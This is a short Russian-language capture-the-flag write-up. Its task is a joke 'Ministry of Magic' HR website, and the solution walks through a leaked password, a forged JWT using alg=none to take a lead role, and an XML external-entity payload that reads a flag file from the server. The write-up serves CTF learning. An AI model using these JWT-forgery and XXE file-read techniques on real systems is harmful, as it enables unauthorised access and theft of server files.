# Хрюшка

## Информация

Скажете вы, что неканонично в магическом мире пользоваться телефонами, компьютерами,
флипперами и прочими атрибутами зависимого от электричества и интернета человека. Но
Министерство магии, увы, решило не стоять на месте, и заказать на новый год у Деда Мороза
(не спрашивайте) модный сайт для системы кадрового учета магов.

Конечно же, маги умные, и решили пока не палиться. Согласитесь, выдай мы вам сервис,
по которому понятно, что он магический, так сразу же простые смертные бы все узнали.
Узнали бы не только оргструктуру Министерства магии, и то, что волшебники существуют, но и,
что не менее ужасно, что и по сей день близ одного шотландского замка взмахами волшебной
палочки соревнуются силы добра и зла.

В ваших руках отговорить Министерство от затеи переходить с толстенных томов, лежащих в 
бухгалтерии, на какие-то компьютеры, из которых в три клика мышкой можно узнать флаг,
который скрывает генеральный директор. Сделайте это быстрее Пожирателей смерти!

## Решение

Видим пароль васи пупкина, заходим под ним и видим оргструктуру, из которой нетрудно получить UID CEO

Видим, что /add_employees васе пупкину недоступна, и нужно быть лидом.

Видим JWT, судя по коду alg=none явно разрешен, пробуем alg=none, получаем себе роль любого лида (зная UID CEO)

Открывая /add_employees, получаем 1 флаг

Добавляем employee по типу

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employee [
  <!ENTITY xxe SYSTEM "file:///app/hard_flag.txt">
]>
<employee>
  <name>&xxe;</name>
  <surname>Injected</surname>
  <department>Backend</department>
  <salary>1337</salary>
</employee>
```

Так как добавление сотрудника не реализовано, содержимое флага проливается в респонс.
